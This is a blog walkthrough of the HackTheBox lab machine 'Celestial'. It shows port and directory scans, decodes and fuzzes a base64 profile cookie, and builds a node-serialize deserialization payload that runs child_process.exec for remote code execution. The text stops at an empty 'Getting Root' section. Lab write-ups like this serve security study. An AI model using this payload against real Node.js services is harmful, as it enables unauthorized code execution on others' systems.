---
layout: post
title: Hackthebox Celestial Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-09-22/celestial-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a machine "Celestial" on that website.<br>

### Complation
48th / 131 boxes

## Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.85 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-22 11:46 EEST
Nmap scan report for 10.10.10.85
Host is up (0.039s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2743.74 seconds
{% endhighlight %}

gobuster port 3000:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.85:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .js
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.85:3000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     js
[+] Timeout:        10s
===============================================================
2019/09/23 00:13:30 Starting gobuster
===============================================================
===============================================================
2019/09/23 00:43:06 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

By accessing the website on port 3000, we can find unique coolkie base64 encoded.
{% highlight shell %}
root@kali:~# curl http://10.10.10.85:3000 -i
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Sun, 29 Sep 2019 06:39:17 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 12
ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
Date: Sun, 29 Sep 2019 06:24:17 GMT
Connection: keep-alive

<h1>404</h1>
{% endhighlight %}

Then, try to decode. Since '%3D' is url encoded value of '=', we have to decode it manually.
{% highlight shell %}
root@kali:~# echo 'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==' | base64 -d
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
{% endhighlight %}

We found some parameters in the cookie.<br>
Then, fuzz this node.js webapp with sending some special values in the cookie.<br>
We can find that if we send "+" as special number, we get following syntax error.
{% highlight shell %}
root@kali:~# echo -n '{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2+"}' | base64
eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVt
YiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrIn0=
{% endhighlight %}
{% highlight shell %}
root@kali:~# curl http://10.10.10.85:3000 -i --cookie 'profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrIn0='
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1074
Date: Fri, 04 Oct 2019 15:28:48 GMT
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected end of input<br> &nbsp; &nbsp;at /home/sun/server.js:13:29<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/sun/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/sun/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/sun/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at cookieParser (/home/sun/node_modules/cookie-parser/index.js:70:5)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)</pre>
</body>
</html>
{% endhighlight %}

On the other hand, if we send following as a payload, we don't get this syntax error
{% highlight shell %}
root@kali:~# echo -n '{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2+2"}' | base64
eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVt
YiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrMiJ9
{% endhighlight %}
{% highlight shell %}
root@kali:~# curl http://10.10.10.85:3000 -i --cookie 'profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrMiJ9'
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 25
ETag: W/"19-TNVBDF0e2JD28Mnzt96ajQ0A3vw"
Date: Fri, 04 Oct 2019 15:37:37 GMT
Connection: keep-alive

Hey Dummy 2+2 + 2+2 is 26
{% endhighlight %}

This means the value of "num" is not used as strings and is used as an argument of eval() or something.<br>
More precisely, the value of "num" is serialized on the web server.<br>
Then, google like following. We can find this blog <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">Exploiting Node.js deserialization bug for Remote Code Execution</a>
{% highlight shell %}
nodejs serialization exploit
{% endhighlight %}

According to that blog, to build the payload for RCE, we need following node.js code and run it.
{% highlight shell %}
root@kali:~# cat buildRCE.js 
var y = {
 rce : function(){
 require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
{% endhighlight %}
{% highlight shell %}
root@kali:~# node buildRCE.js 
Serialized: 
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });\n }"}
{% endhighlight %}

### 3. Getting Root


